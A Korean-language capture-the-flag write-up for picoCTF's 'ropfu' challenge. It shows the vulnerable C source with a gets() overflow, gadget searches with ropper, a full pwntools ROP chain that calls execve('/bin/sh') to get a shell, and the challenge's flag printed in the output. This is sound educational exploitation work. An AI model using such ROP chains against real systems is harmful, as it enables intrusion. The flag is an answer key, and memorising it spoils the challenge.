# [ropfu](https://play.picoctf.org/practice/challenge/292?category=6&originalEvent=70&page=1&search=)
<br />

**Description:**
> What's ROP?
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);


  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=232215a502491a549a155b1a790de97f0c433482, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
<br />
<br />

바이너리에서 제공되는 가젯을 이용해서 rop 공격을 수행하여 쉘을 따면 되는 간단한 문제입니다. rop를 하기 전에 필요한 가젯을 찾겠습니다.

<br />

```yaml
$ ropper -f vuln --search "pop edx"
0x080583b9: pop edx; pop ebx; ret;
0x08092425: pop edx; xor eax, eax; pop edi; ret;
```
```yaml
$ ropper -f vuln --search "pop eax"
0x080b073a: pop eax; ret;
```
```yaml
$ ropper -f vuln --search "pop ebx"
0x08056114: pop ebx; ret;
```
```yaml
$ ropper -f vuln --search "mov [edx]"
0x080590f2: mov dword ptr [edx], eax; ret;
```
```yaml
$ ropper -f vuln --search "xor ecx"
0x0804a73f: xor ecx, ecx; int 0x80;
```
```yaml
$ readelf -s vuln | grep "bss"
    23: 080e62c0     0 SECTION LOCAL  DEFAULT   23 .bss
```

`execve("/bin/sh", 0, 0)`을 호출하기 위해 rop를 수행할 필요 가젯을 모두 찾았습니다. 이제 공격 코드를 작성할 수 있습니다.

<br />
<br />

```python
from pwn import *

context.log_level = 'error'
context.arch = 'x86'

def conn():
    if len(sys.argv) == 3:
        host, port = sys.argv[1], int(sys.argv[2])
        p = remote(host, port)
    else:
        p = process('./vuln')
    return p

pop_edx_xor_pop = 0x08092425  # pop edx; xor eax, eax; pop edi; ret;
pop_eax = 0x080b073a
pop_ebx = 0x08056114
pop_edx = 0x080583b9      # pop edx; pop ebx; ret;
mov_edx = 0x080590f2      # mov dword ptr [edx], eax; ret;
xor_ecx_int = 0x0804a73f  # xor ecx, ecx; int 0x80;
bss = 0x80e62c0

str = [b'//bi', b'n/sh']
pay = flat(

  {28:pop_eax}, str[0],  # eax = '//bi'
  pop_edx, bss, 0,       # edx = [bss]
  mov_edx,               # [bss] = '//bi'

  pop_eax, str[1],       # eax = 'n/sh'
  pop_edx, bss+4, 0,     # edx = [bss+4]
  mov_edx,               # [bss+4] = 'n/sh'

  pop_ebx, bss,          # ebx = [bss]
  pop_edx_xor_pop, 0, 0, # edx = 0
  pop_eax, 0xb,          # eax = 0xb
  xor_ecx_int            # ecx = 0, call execve

)

p = conn()

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py saturn.picoctf.net 51659
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
$ ls
flag.txt
vuln
$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_4cbbb771}$
```
